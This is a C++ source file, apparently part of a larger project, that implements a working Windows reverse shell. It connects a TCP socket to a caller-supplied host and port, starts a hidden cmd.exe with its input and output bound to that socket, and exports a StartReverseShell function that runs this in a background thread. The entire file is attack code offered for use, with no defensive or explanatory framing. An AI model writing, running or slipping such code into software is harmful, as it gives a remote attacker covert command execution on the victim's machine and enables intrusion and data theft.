// src/shell.cpp
// Must include winsock2.h before windows.h
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

DWORD WINAPI ReverseShellThread(LPVOID lpParam) {
    const char* target = (const char*)lpParam;
    char host[64];
    int port;
    if (sscanf(target, "%63[^:]:%d", host, &port) != 2) {
        HeapFree(GetProcessHeap(), 0, (LPVOID)target);
        return 1;
    }

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        HeapFree(GetProcessHeap(), 0, (LPVOID)target);
        return 1;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        HeapFree(GetProcessHeap(), 0, (LPVOID)target);
        return 1;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
        closesocket(sock);
        WSACleanup();
        HeapFree(GetProcessHeap(), 0, (LPVOID)target);
        return 1;
    }

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        HeapFree(GetProcessHeap(), 0, (LPVOID)target);
        return 1;
    }

    // Use CreateProcessA with a writable command line
    char cmdLine[] = "cmd.exe";
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        closesocket(sock);
        WSACleanup();
        HeapFree(GetProcessHeap(), 0, (LPVOID)target);
        return 1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    closesocket(sock);
    WSACleanup();
    HeapFree(GetProcessHeap(), 0, (LPVOID)target);
    return 0;
}

extern "C" void StartReverseShell(const char* target) {
    char* dup = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, strlen(target) + 1);
    if (!dup) return;
    strcpy(dup, target);
    CreateThread(NULL, 0, ReverseShellThread, dup, 0, NULL);
}